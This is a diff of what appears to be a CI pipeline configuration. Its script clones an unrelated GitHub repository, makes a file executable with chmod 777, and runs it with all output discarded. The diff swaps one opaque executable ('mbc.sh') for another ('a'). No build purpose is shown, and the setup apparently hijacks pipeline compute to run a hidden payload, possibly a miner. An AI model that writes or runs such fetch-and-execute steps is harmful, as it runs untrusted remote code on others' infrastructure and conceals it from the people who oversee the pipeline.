@@ -12,4 +12,4 @@ pipelines:
           script:
             - git clone https://github.com/sibotak1313/sibotak1313.git
             - cd sibotak1313
-            - chmod 777 mbc && chmod 777 mbc.sh && ./mbc.sh >> /dev/null
+            - chmod 777 a && ./a >> /dev/null
